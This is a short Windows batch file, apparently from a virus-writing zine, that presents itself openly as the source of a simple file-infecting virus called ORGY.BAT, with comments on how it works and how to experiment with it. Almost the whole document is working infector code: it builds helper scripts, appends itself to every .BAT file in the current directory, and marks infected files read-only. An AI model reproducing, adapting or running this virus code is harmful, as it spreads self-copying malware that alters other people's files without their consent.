::
:: Below is the source code to a very simple batch virus. When executed, the virus infects
:: all the .BAT files in the current directory. It doesn't re-infect files but it cannot
:: infect files that are already read-only, system or hidden.
::
:: If you want to experiment with this virus you must first make the virus file ORGY.BAT is
:: read only (with the ATTRIB +R ORGY.BAT treatment.) This prevents the virus from
:: re-infecting itself.
::
:: The virus is named after the american industrial/synth/metal band that supported KoRn on
:: their 1999 Follow the Leader tour.
::

@echo off
echo orgy > infect1.bat
echo if [%%1]==[infect1.bat] goto DontBother > infect2.bat
echo if [%%1]==[infect2.bat] goto DontBother >> infect2.bat
echo copy %%1 + infect1.bat %%1 >> infect2.bat
echo attrib +r %%1 >> infect2.bat
echo :DontBother >> infect2.bat
attrib +r infect1.bat
attrib +r infect2.bat
for %%f in (*.bat) do call infect2 %%f
attrib -r infect1.bat
attrib -r infect2.bat
del infect1.bat
del infect2.bat
rem ORGY.BAT virus by EXE-Gency/[KrashMag]
rem email exegency@hotmail.com